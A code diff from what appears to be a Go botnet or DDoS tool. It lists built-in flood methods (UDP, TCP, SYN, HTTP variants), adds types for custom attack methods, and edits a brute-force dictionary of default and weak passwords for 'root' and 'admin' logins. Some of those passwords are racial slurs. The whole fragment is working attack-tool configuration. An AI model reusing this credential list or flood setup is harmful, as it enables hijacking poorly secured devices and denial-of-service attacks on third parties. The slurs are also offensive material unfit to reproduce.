@@ -11,13 +11,16 @@ var (
 	//WARNING: these are builtin methods, dont change them
 	Methods = []string{"UDP", "TCP", "SYN", "UDPRAPE", "HTTP", "UDP-VIP"}
 
+	//WARNING: these are builtin types for custom methods , dont change them
+	validtypes = []string{"ip", "port", "int", "string"}
+
 	// config here
 	//brute force <user> : list of passwords
 	PasswordMap = map[string][]string{
 		"root": {
 			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
 		},
-		"Admin": {
+		"admin": {
 			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
 		},
 	}
